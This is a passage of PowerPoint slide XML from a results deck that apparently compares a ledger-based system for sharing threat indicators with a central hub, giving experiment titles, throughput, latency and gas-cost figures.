        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3904488"/>
            <a:ext cx="256032" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="setup 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="960120" y="3831336"/>
            <a:ext cx="3566160" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>13,810 blocks in one 183 s run</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="experiment 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="1417320"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="experiment 1 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="1417320"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E1  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Scaling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="experiment 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="1417320"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="experiment 2 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="1417320"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E2  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Gas &amp; batching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="experiment 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="2185416"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="experiment 3 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2185416"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E3  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Bootstrap</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="experiment 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2185416"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="experiment 4 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="2185416"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E4  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Accuracy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="experiment 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="2953512"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="experiment 5 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2953512"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E5  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sybil &amp; echo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="experiment 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="2953512"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="experiment 6 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="2953512"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E6  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tamper detection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="experiment 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="3721608"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="experiment 7 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="3721608"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E7  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hub baseline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="experiment 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="3721608"/>
            <a:ext cx="1783080" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="experiment 8 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6903720" y="3721608"/>
            <a:ext cx="1600200" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>E8  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Propagation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RESULTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Throughput: ledger 255 vs. hub 1,737 events/s</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="throughput chart" descr=""/>
          <p:cNvGraphicFramePr/>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="457200" y="1325880"/>
          <a:ext cx="5394960" cy="3291840"/>
        </p:xfrm>
        <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/chart">
            <c:chart xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart" r:id="rId1"/>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="stat 1 value"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1417320"/>
            <a:ext cx="2423160" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>6.8×</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="stat 1 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1920240"/>
            <a:ext cx="2423160" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hub speed advantage at N = 16</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="stat 2 value"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2286000"/>
            <a:ext cx="2423160" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>11.74 ms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="stat 2 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2788920"/>
            <a:ext cx="2423160" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>median latency at 16 writers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="stat 3 value"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3154680"/>
            <a:ext cx="2423160" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1,118 ms</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="stat 3 label"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="3657600"/>
            <a:ext cx="2423160" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>p99 latency once the chain saturates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="throughput caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4069080"/>
            <a:ext cx="2423160" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The price of removing the trusted middleman, measured.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>RESULTS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cost matches the calldata model to the unit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="cost tile 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1371600"/>
            <a:ext cx="2468880" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>22,120</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>gas per IOC, unbatched</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Measured = EIP-2028 model</a:t>
            </a:r>
